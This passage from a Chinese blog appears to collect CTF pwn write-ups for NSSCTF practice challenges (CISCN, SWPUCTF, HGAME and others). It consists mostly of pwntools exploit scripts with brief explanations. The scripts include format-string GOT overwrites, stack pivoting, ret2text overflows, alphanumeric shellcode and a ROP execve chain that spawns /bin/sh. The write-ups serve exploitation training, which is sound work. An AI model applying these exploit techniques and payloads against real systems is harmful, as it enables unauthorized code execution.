remote(&quot;node4.anna.nssctf.cn&quot;,28307)</span><br><span class=\"line\">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class=\"line\">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class=\"line\">#gdb.attach(p)</span><br><span class=\"line\">#pause()</span><br><span class=\"line\">payload1 = fmtstr_payload(6, &#123;printf_got: system_plt&#125;)</span><br><span class=\"line\">log.info(payload1)</span><br><span class=\"line\">sleep(0.1)</span><br><span class=\"line\">p.sendafter(&#x27;name: \\n&#x27;,payload1)</span><br><span class=\"line\">vuln_addr = 0x40076F</span><br><span class=\"line\">#pause()</span><br><span class=\"line\">payload2 =b&#x27;a&#x27;*(0x50+0x8) + p64(vuln_addr)</span><br><span class=\"line\">sleep(0.1)</span><br><span class=\"line\">p.sendafter(&#x27;on !\\n&#x27;,payload2)</span><br><span class=\"line\">#pause()</span><br><span class=\"line\">sleep(0.1)</span><br><span class=\"line\">p.sendafter(&#x27;name: \\n&#x27;,&quot;/bin/sh\\x00&quot;)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>还能使用栈迁移如:<br />\n 使用字符串泄露来得到 rbp 栈底位置，使用 stack 查看 rbp 是多少在使用溢出满满调试得到为 %16p 即可得到 rbp，在 s 处输入字符后使用 pwndbg 的 search 查看位置，然后在计算和 s 的值相差多少，使用 pwndbg 的 distance 即可计算出相差量为 60,rbp 和 s 相差 0x60 还有 0x8 的返回地址，即可算到需要迁移的栈地址为多多 qianyi_rbp-0x60-0x8, 在使用常规的 rdi pop;ret 来将 /bin/sh 压入 system 函数中，但是中间需要加一个 qianyi_rbp-0x20 来维持栈平衡</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">io=remote(&#x27;node4.anna.nssctf.cn&#x27;,28526)</span><br><span class=\"line\">io.recvuntil(b&#x27;name: \\n&#x27;)</span><br><span class=\"line\">elf=ELF(&#x27;./hdctf&#x27;)</span><br><span class=\"line\">fmtpayload = b&#x27;%16$p&#x27;</span><br><span class=\"line\">io.send(fmtpayload)</span><br><span class=\"line\">io.recvuntil(b&#x27;hello,0x&#x27;)</span><br><span class=\"line\">old_rbp = int(io.recv(12), 16)</span><br><span class=\"line\">log.success(&#x27;RBP Addr: &#x27; + (hex(old_rbp)))</span><br><span class=\"line\">leave_ret = 0x4007F2</span><br><span class=\"line\">rdi = 0x4008D3</span><br><span class=\"line\">system = elf.sym[&#x27;system&#x27;]</span><br><span class=\"line\">Target_Addr = old_rbp - 0x60 - 0x08</span><br><span class=\"line\"># RDI will pop binsh addr as system&#x27;s arg</span><br><span class=\"line\"># Offset : 0x08</span><br><span class=\"line\">Payload = p64(rdi)</span><br><span class=\"line\"># Offset : 0x08 + 0x08</span><br><span class=\"line\">Payload += p64(Target_Addr + 0x8 + 0x18)</span><br><span class=\"line\"># Offset : 0x08 + 0x10</span><br><span class=\"line\">Payload += p64(system)</span><br><span class=\"line\"># Offset : 0x08 + 0x18</span><br><span class=\"line\">Payload += b&#x27;/bin/sh\\x00&#x27;</span><br><span class=\"line\"># Fill the Payload to 0x50.</span><br><span class=\"line\">Payload = Payload.ljust(0x50, b&#x27;\\x00&#x27;)</span><br><span class=\"line\"># The Leave Ret cmd&#x27;s ret addr.</span><br><span class=\"line\">Payload += p64(Target_Addr)</span><br><span class=\"line\"># The Leave Ret</span><br><span class=\"line\">Payload += p64(leave_ret)</span><br><span class=\"line\">log.info(Payload)</span><br><span class=\"line\">io.recvuntil(b&#x27;keep on !\\n&#x27;)</span><br><span class=\"line\">io.send(Payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2022-新生赛shellcode\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛shellcode\">#</a> [SWPUCTF 2022 新生赛] shellcode？</h5>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zaGVsbGNyYWZ0LXNqMnA2NDNhanQ4Y3V0MmFxaTNhYnRlZTQ3Y2d3NGN2aWE3MmNuMjRlLnNo\">还不能输入比较长的我用 shellcraft.sh</span> () 生成不行</p>\n<h5 id=\"nustctf-2022-新生赛ezpwn\"><a class=\"anchor\" href=\"#nustctf-2022-新生赛ezpwn\">#</a> [NUSTCTF 2022 新生赛] ezPwn</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">什么判断直接不管gets溢出后直接跳转到system地址即可</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote()</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">payload=cyclic(0x12)+p64(elf.sym[&#x27;system&#x27;])</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hgame-2023-week1easy_overflow\"><a class=\"anchor\" href=\"#hgame-2023-week1easy_overflow\">#</a> [HGAME 2023 week1]easy_overflow</h5>\n<p>很简单的一个 ret2text 但是有个坑点就是 close (1) 这个点你需要连上去后使用 exec 1&gt;&amp;0 来打开标准输出</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28539)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x40101a)+p64(0x401176)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2022-初赛login_normal\"><a class=\"anchor\" href=\"#ciscn-2022-初赛login_normal\">#</a> [CISCN 2022 初赛] login_normal</h5>\n<p>这个题考点在于代码审计</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">context.arch=&#x27;amd64&#x27;</span><br><span class=\"line\">io=remote(&quot;node4.anna.nssctf.cn&quot;,28823)</span><br><span class=\"line\">#io=process(&#x27;./login&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(&quot;=================&quot;)</span><br><span class=\"line\">#gdb.attach(io)</span><br><span class=\"line\">payload = b&#x27;opt:1\\nmsg:ro0tt\\n&#x27;</span><br><span class=\"line\">#gdb.attach(io)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">#shellcode = shellcraft.sh()</span><br><span class=\"line\">shellcode=b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span><br><span class=\"line\">payload = b&#x27;opt:2\\nmsg:&#x27;+shellcode+b&#x27;\\n&#x27;</span><br><span class=\"line\">io.recvuntil(&quot;&gt;&gt;&gt; &quot;)</span><br><span class=\"line\">#gdb.attach(io)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2022-新生赛darling\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛darling\">#</a> [SWPUCTF 2022 新生赛] Darling</h5>\n<p>随机数 srand</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import ctypes</span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\">libc.srand(0x1317E53)</span><br><span class=\"line\">sl=libc.rand()%100-64</span><br><span class=\"line\">p.sendline(str(sl))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"uuctf-2022-新生赛babystack\"><a class=\"anchor\" href=\"#uuctf-2022-新生赛babystack\">#</a> [UUCTF 2022 新生赛] babystack</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28003)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x108+p64(0x0400591)+p64(0x400726)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2019东南pwn2\"><a class=\"anchor\" href=\"#ciscn-2019东南pwn2\">#</a> [CISCN 2019 东南] PWN2</h5>\n<p>这个题很不错适合新手吃 32 位的栈偏移</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">leave_ret=0x080485FD  </span><br><span class=\"line\">offset=0xffffcd58-0xffffcd20</span><br><span class=\"line\">io=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">io=remote(&#x27;node5.anna.nssctf.cn&#x27;,28203)</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\"># 第一次溢出1字节覆盖\\x00，泄露ebp</span><br><span class=\"line\">io.sendafter(b&#x27;name?\\n&#x27;,b&#x27;a&#x27;*(0x28-1)+b&#x27;b&#x27;)</span><br><span class=\"line\">io.recvuntil(b&#x27;aaab&#x27;)</span><br><span class=\"line\">leak_ebp=u32(io.recvuntil(b&#x27;\\xff&#x27;))</span><br><span class=\"line\">success(hex(leak_ebp)) </span><br><span class=\"line\">target_addr=leak_ebp-offset-0x4 # -0x4是因为第二次leave;ret的时候，pop esp会导致+0x4</span><br><span class=\"line\"> # 第二次溢出，rop写在s中，栈迁移到s，调用system，参数为自己写在栈上的/bin/sh，参数偏移计算可</span><br><span class=\"line\">payload=p32(elf.plt[&#x27;system&#x27;])+p32(elf.sym[&#x27;_start&#x27;])+p32(leak_ebp-offset+0xc)+b&#x27;/bin/sh\\x00&#x27;</span><br><span class=\"line\">payload=payload.ljust(0x28,b&#x27;a&#x27;)+p32(target_addr)+p32(leave_ret)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2023-初赛烧烤摊儿\"><a class=\"anchor\" href=\"#ciscn-2023-初赛烧烤摊儿\">#</a> [CISCN 2023 初赛] 烧烤摊儿</h5>\n<p>这是一个 64 位的 ret2syscall 注意 execve 调用位 64 是 59，或者可以直接使用 ropgadget 的 ropchain 来直接生成 payload 首先审计源码利用负数达到金额然后在利用改名里面的溢出达到 shell，注意这个是静态</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">from struct import pack</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">io=remote(&#x27;node4.anna.nssctf.cn&#x27;,28947)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(1))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(1))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(-10000))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(4))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(5))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p = b&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .data</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000458827) # pop rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += b&#x27;/bin//sh&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040264f) # pop rdi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .data</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004a404b) # pop rdx ; pop rbx ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x4141414141414141) # padding</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += 